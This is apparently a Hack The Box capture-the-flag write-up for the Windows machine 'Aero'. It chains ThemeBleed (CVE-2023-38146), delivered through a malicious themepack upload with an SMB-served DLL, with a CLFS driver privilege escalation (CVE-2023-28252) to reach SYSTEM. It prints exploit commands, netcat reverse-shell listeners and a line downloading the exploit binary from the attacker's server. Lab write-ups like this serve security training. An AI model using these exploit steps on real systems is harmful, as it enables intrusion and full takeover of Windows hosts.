---
title: "HTB: Aero"
date: 2026-04-10
draft: false
categories: ["writeup"]
tags:
  - hackthebox
  - windows
  - medium
  - themebleed
  - CVE-2023-38146
  - CVE-2023-28252
  - windows-themes
  - clfs-driver
  - iis
description: "Aero is a medium Windows box exploiting the ThemeBleed vulnerability (CVE-2023-38146) for initial access and the CLFS driver EoP (CVE-2023-28252) for SYSTEM."
summary: "Aero is a medium Windows box exploiting the ThemeBleed vulnerability (CVE-2023-38146) for initial access and the CLFS driver EoP (CVE-2023-28252) for SYSTEM."
cover:
  image: "/images/htb-aero/info-card.png"
  alt: "HTB Aero"
  relative: false
showToc: true
TocOpen: false
---

## Box Info

| | |
|---|---|
| **OS** | Windows |
| **Difficulty** | Medium |
| **Release** | 2023 |

Aero is a medium Windows box from Hack The Box. The target runs IIS hosting "Aero Theme Hub", a Windows 11 theme repository with a file upload feature. The site accepts `.themepack` files, which opens the door to CVE-2023-38146 (ThemeBleed), a vulnerability in how Windows handles `.theme` files that reference version 999 style resources. Uploading a malicious themepack gets code execution as sam.emerson. From there, a hint in the user's documents points toward CVE-2023-28252, a privilege escalation in the Windows Common Log File System (CLFS) driver that gives SYSTEM.

### Kill Chain

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan, find IIS on port 80 | Aero Theme Hub with file upload |
| 2 | Identify Windows theme attack surface | CVE-2023-38146 (ThemeBleed) |
| 3 | Generate malicious themepack with PoC, start SMB server | `evil_theme.themepack` served via SMB |
| 4 | Upload themepack, catch reverse shell | Shell as sam.emerson |
| 5 | Find CVE-2023-28252 hint in user's documents | CLFS driver EoP path |
| 6 | Compile CLFS exploit with reverse shell payload | `clfs_eop.exe` |
| 7 | Transfer and execute on target | Shell as SYSTEM |

## Recon

### nmap

Starting with a service scan on the open port:

```console
$ nmap -p 80 -sCV 10.129.229.128
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Aero Theme Hub
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Just one port. IIS 10.0 hosting something called "Aero Theme Hub."

### Aero Theme Hub - TCP 80

Visiting the site, it's a clean landing page for a "free, community driven Windows 11 theme repository."

![Aero Theme Hub homepage showing Windows 11 theme repository branding](/images/htb-aero/aero-theme-hub-homepage.png)

Windows 11 themes. That's interesting. I know Windows theme files have had security issues in the past, so I searched for known exploits.

![Google search for windows theme exploit](/images/htb-aero/google-windows-theme-exploit.png)

This leads to CVE-2023-38146, dubbed "ThemeBleed." It's a vulnerability in how Windows handles `.msstyles` files referenced by themes. When a theme file specifies a version 999 resource, Windows loads a DLL (`_vrf.dll`) from the path specified in the theme, including remote UNC paths. By serving a malicious DLL over SMB, an attacker gets arbitrary code execution when the theme is applied.

There's a solid PoC available: [CVE-2023-38146 by Jnnshschl](https://github.com/Jnnshschl/CVE-2023-38146).

The site also has a file upload form for submitting custom themes. That's our delivery mechanism.

![Theme upload form with Choose File button](/images/htb-aero/theme-upload-form.png)

## Shell as sam.emerson

### ThemeBleed (CVE-2023-38146)

First, clone the PoC and set it up:

```console
$ git clone https://github.com/Jnnshschl/CVE-2023-38146.git
$ cd CVE-2023-38146
$ python3 -m venv venv
$ source venv/bin/activate
$ pip install -r requirements.txt
```

Start a netcat listener:

```console
$ rlwrap nc -lvnp 9001
```

Then run the exploit. It generates a malicious theme file, compiles a DLL payload, and starts an SMB server to serve it:

```console
$ sudo $(which python3) themebleed.py -r 10.10.15.229 -p 9001
2026-04-09 17:37:32,131 INFO> ThemeBleed CVE-2023-38146 PoC
2026-04-09 17:37:32,663 INFO> Compiled DLL: "./tb/Aero.msstyles_vrf_evil.dll"
2026-04-09 17:37:32,664 INFO> Theme generated: "evil_theme.theme"
2026-04-09 17:37:32,664 INFO> Themepack generated: "evil_theme.themepack"
2026-04-09 17:37:32,664 INFO> Starting SMB server: 10.10.15.229:445
...[snip]...
```

Now upload `evil_theme.themepack` through the site's upload form.

![Selecting evil_theme.themepack in the upload form](/images/htb-aero/theme-upload-selected.png)

![Clicking the Upload File button](/images/htb-aero/theme-upload-click.png)

The server applies the theme, which pulls the malicious DLL over SMB and executes it. The shell comes back on the listener.

![Reverse shell as sam.emerson with whoami and ipconfig output](/images/htb-aero/shell-sam-emerson-whoami.png)

We're in as `aero\sam.emerson`.

### user.txt

```console
PS> cat user.txt
8e12dd47************************
```

![user.txt flag on sam.emerson's desktop](/images/htb-aero/user-flag.png)

## Shell as SYSTEM

### Enumeration

Poking around sam.emerson's home directory, there's something interesting in the Documents folder:

![Directory listing showing CVE-2023-28252_Summary.pdf and watchdog.ps1](/images/htb-aero/sam-emerson-documents.png)

A PDF named `CVE-2023-28252_Summary.pdf`. That's a pretty direct hint. CVE-2023-28252 is a privilege escalation vulnerability in the Windows Common Log File System (CLFS) driver. It allows a local attacker to corrupt CLFS log file metadata, leading to arbitrary kernel memory writes and ultimately SYSTEM privileges. There's a [public PoC from Fortra](https://github.com/fortra/CVE-2023-28252).

### Building the CLFS Exploit

This exploit needs to be compiled on a Windows machine. Download the PoC and open `clfs_eop.sln` in Visual Studio.

![CVE-2023-28252 repository contents with clfs_eop solution file](/images/htb-aero/cve-28252-repo-contents.png)

Open the solution via File > Open > Project/Solution.

![Visual Studio File menu opening the project](/images/htb-aero/vs-open-project.png)

In the Solution Explorer, open `clfs_eop.cpp` under Source Files.

![Solution Explorer showing clfs_eop.cpp](/images/htb-aero/vs-solution-explorer.png)

The exploit code calls `notepad.exe` when it gets SYSTEM. I need to find that line and replace it with a reverse shell payload.

![Source code showing the system("notepad.exe") call highlighted](/images/htb-aero/vs-notepad-system-call.png)

I generated a PowerShell Base64 reverse shell one-liner using revshells.com, pointing to my IP on port 9002.

![Reverse Shell Generator with PowerShell Base64 payload](/images/htb-aero/revshells-powershell-payload.png)

Then replaced the `notepad.exe` call with the PowerShell one-liner:

![Modified exploit code with reverse shell payload replacing notepad.exe](/images/htb-aero/vs-exploit-code-modified.png)

Switch the build configuration to Release and x64:

![Visual Studio build configuration set to Release x64](/images/htb-aero/vs-release-x64.png)

Build with Ctrl+Shift+B. It compiles successfully.

![Build output showing Build: 1 succeeded, 0 failed](/images/htb-aero/vs-build-succeeded.png)

### Exploitation

Transfer the compiled exploit to the target. On my Kali box, start an HTTP server:

```console
$ python3 -m http.server
```

Then on the target, download it:

```console
PS> iwr http://10.10.15.229:8000/clfs_eop.exe -outfile clfs_eop.exe
```

Start a new listener on Kali:

```console
$ rlwrap nc -lvnp 9002
```

And run the exploit on the target:

```console
PS> .\clfs_eop.exe
```

The CLFS exploit corrupts log file metadata to get a kernel write primitive, escalates to SYSTEM, and fires the reverse shell.

![SYSTEM shell with whoami and ipconfig output](/images/htb-aero/root-shell-whoami.png)

We're SYSTEM.

### root.txt

```console
PS> cat root.txt
7a896840************************
```

![root.txt flag on administrator's desktop](/images/htb-aero/root-flag.png)
